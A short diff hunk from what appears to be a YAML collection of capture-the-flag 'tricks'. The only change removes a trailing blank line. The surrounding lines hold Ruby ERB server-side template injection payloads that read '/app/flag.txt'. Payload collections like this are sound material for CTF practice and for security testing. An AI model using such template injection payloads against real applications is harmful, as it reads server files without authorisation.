@@ -37,4 +37,3 @@ tricks:
     payload: |
       <%= File.read('/app/flag.txt') %>
       <%= IO.read('/app/flag.txt') %>
-
